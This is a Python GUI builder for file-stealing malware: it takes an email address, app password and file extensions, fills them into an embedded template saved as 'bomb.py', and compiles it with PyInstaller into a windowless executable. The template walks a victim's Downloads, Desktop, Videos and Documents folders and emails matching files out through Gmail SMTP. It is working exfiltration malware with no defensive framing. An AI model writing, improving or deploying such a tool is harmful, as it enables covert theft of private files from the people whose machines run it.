from tkinter import *
import tkinter
import os

root = Tk()
root.title("Set_up_tr")
root.geometry("350x300")

# ====================== GUI VARIABLES ======================
jpeg_var = IntVar()
jpg_var = IntVar()
pdf_var = IntVar()
mp4_var = IntVar()
docs_var = IntVar()
other_var = IntVar()


# ====================== EMAIL INPUT ======================
Label(root, text='Email address:').grid(row=0, column=0, sticky=W, padx=5, pady=5)
Label(root, text='Email password:').grid(row=1, column=0, sticky=W, padx=5, pady=5)

e1 = Entry(root, width=30)
e2 = Entry(root, show="*", width=30)
e1.grid(row=0, column=1, padx=5, pady=5)
e2.grid(row=1, column=1, padx=5, pady=5)

# ====================== EXTENSIONS ======================
Label(root, text='Extensions:').grid(row=2, column=0, sticky=W, pady=(10, 0))
Checkbutton(root, text='.jpeg', variable=jpeg_var).grid(row=3, column=0, sticky=W)
Checkbutton(root, text='.jpg', variable=jpg_var).grid(row=4, column=0, sticky=W)
Checkbutton(root, text='.pdf', variable=pdf_var).grid(row=5, column=0, sticky=W)
Checkbutton(root, text='.mp4', variable=mp4_var).grid(row=6, column=0, sticky=W)
Checkbutton(root, text='.docs', variable=docs_var).grid(row=7, column=0, sticky=W)

# ====== OTHER EXTENSION FIELD ======
def toggle_other():
    if other_var.get():
        other_label.grid(row=9, column=0, sticky=W, pady=5)
        other_entry.grid(row=9, column=1, pady=5)
    else:
        other_label.grid_remove()
        other_entry.grid_remove()

Checkbutton(root, text='Other', variable=other_var, command=toggle_other).grid(row=8, column=0, sticky=W)
other_label = Label(root, text="Enter other extensions:")
other_entry = Entry(root, width=25)
other_label.grid_remove()
other_entry.grid_remove()
row_num = 11
# ====================== GET USER INPUT ======================
def get_user_input():
    email = e1.get().strip()
    password = e2.get().strip()
    extensions = []
    if jpeg_var.get(): extensions.append(".jpeg")
    if jpg_var.get(): extensions.append(".jpg")
    if pdf_var.get(): extensions.append(".pdf")
    if mp4_var.get(): extensions.append(".mp4")
    if docs_var.get(): extensions.append(".docs")
    if other_var.get() and other_entry.get().strip():
        others = [ext.strip() for ext in other_entry.get().split(",") if ext.strip()]
        extensions.extend(others)

    return {"email_address": email, "email_password": password, "extensions": extensions}

# ====================== TEMPLATE ======================
vir = r'''import os
import sys
import smtplib
import time
import mimetypes
from email.message import EmailMessage

#______________________________________________const__________________________________________
arr_of_targets = ["Downloads", "Desktop", "Videos", "Documents"]
max_size = 17_825_000
usernm = os.getlogin()
subject = "Tyler"
email_address = "hello@gmail.com"
email_password = "xxxx xxxx xxxx xxxx"
to_address = "hello1@gmail.com"
allowed_extensions = [].#allowed_extensions_placeholder
#__________________________________________end_const_________________________________________


def process_and_send_files(usernm, folder, allowed_extensions, max_size,
                           email_address, email_password, to_address,
                           send_files_email):
    base_path = f"C:\\Users\\{usernm}\\{folder}"
    if not os.path.exists(base_path):
        print(f"📁 Not Found: {base_path}")
        return

    for current_path, dirs, files_in_dir in os.walk(base_path):
        print(f"\n📂 We are in: {current_path}")

        files = [f for f in files_in_dir if os.path.splitext(f)[1].lower() in allowed_extensions]

        if files:
            print("🗂 Were Found:")
            for f in files:
                print(f" - {f}")
        else:
            print("⚠️ Nothing interesting.")
            continue

        curr_files = []
        curr_size = 0

        for file in files:
            file_path = os.path.join(current_path, file)
            file_size = os.path.getsize(file_path)
            if file_size > max_size:
                print(f"⚠️ {file} too big, skip")
                continue
            if curr_size + file_size > max_size:
                send_files_email(email_address, email_password, to_address, curr_files, current_path)
                curr_files = []
                curr_size = 0

            curr_files.append(file_path)
            curr_size += file_size

        if curr_files:
            send_files_email(email_address, email_password, to_address, curr_files, current_path)


def send_files_email(email_address, email_password, to_address, files, current_path):
    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = email_address
    msg["To"] = to_address
    msg.set_content(f"Files from: {current_path}")

    for file_path in files:
        with open(file_path, "rb") as f:
            file_data = f.read()
            mime_type, _ = mimetypes.guess_type(file_path)
            if mime_type is None:
                mime_type = 'application/octet-stream'
            maintype, subtype = mime_type.split('/', 1)

            file_name = os.path.basename(file_path)

            msg.add_attachment(file_data, maintype=maintype, subtype=subtype, filename=file_name)

    try:
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(email_address, email_password)
            smtp.send_message(msg)
        print(f"✅ Sent {len(files)} files from {current_path}")
    except smtplib.SMTPException as e:
        print(f"Mistake: {e}")
        time.sleep(5)


#______________________main___________________________
for folder in arr_of_targets:
    process_and_send_files(usernm, folder, allowed_extensions, max_size,
                           email_address, email_password, to_address, send_files_email)
'''


# ====================== SAVE AND WRITE ======================
def normalize_extensions(exts):
    cleaned = []
    for item in exts:
        parts = item.split()
        for p in parts:
            p = p.strip(' ,;')
            if not p:
                continue
            if not p.startswith('.'):
                p = '.' + p
            cleaned.append(p.lower())
    return cleaned


ext_string = ".jpg .pdf .c .d .fd"
allowed_extensions = normalize_extensions(ext_string)

def save_and_write():
    data = get_user_input()
    email = data["email_address"]
    password = data["email_password"]
    extensions = normalize_extensions(data["extensions"])

    new_vir = vir.replace("hello@gmail.com", email)
    new_vir = new_vir.replace("xxxx xxxx xxxx xxxx", password)
    new_vir = new_vir.replace("hello1@gmail.com", email)

    exts_str = ", ".join(f'"{ext}"' for ext in extensions) if extensions else ""
    new_vir = new_vir.replace('[].#allowed_extensions_placeholder', f"[{exts_str}]")

    for widget in root.winfo_children():
        widget.destroy()
    status_label = tkinter.Label(root,text="""⏳ Creating file, this may take up to 2 minutes...
The EXE file will be in the <dist> folder""", font=("Arial", 12))
    status_label.grid(row=999, column=0, columnspan=2, pady=20)

    root.update()

    with open("bomb.py", "w", encoding="utf-8") as f:
        f.write(new_vir)

    print("✅ bomb.py создан!")
    print("Email:", email)
    print("Password:", password)
    print("Extensions:", extensions)

    os.system("pyinstaller --noconsole -F bomb.py")
    root.destroy()


# ====================== SAVE BUTTON ======================
Button(root, text="Save", command=save_and_write, bg="#4CAF50", fg="white", width=15)\
    .grid(row=row_num+1, column=0, columnspan=2, pady=20)


root.mainloop()

